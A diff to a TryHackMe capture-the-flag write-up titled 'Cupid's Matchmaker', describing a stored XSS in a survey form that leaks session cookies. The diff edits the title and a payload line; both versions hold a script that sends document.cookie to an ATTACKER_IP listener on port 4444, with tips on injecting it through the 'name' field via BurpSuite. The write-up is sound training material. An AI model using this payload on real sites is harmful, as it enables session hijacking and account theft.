@@ -1,4 +1,4 @@
-# Cupid's Matchmaker — Love At First Breach CTF (TryHackMe)
+# Cupid's Matchmaker
 
 **Category:** Web Exploitation  
 **Vulnerability:** Stored XSS → Session Cookie Exfiltration  
@@ -77,7 +77,7 @@ python3 -m http.server 4444
 In the survey form, intercept the POST request with BurpSuite and submit the following payload as one of the answers:
 
 ```html
-<script>fetch("http://<ATTACKER_IP>:4444/?test="%2bdocument.cookie);</script>
+<script>fetch("http://<ATTACKER_IP>:4444/?test1="%2bdocument.cookie);</script>
 ```
 
 Don't forget to URL-encode the character '+' (%2b URL-encoded), because this would be interpreted as a simple white space in the request. I used the "name" parameter for the XSS.
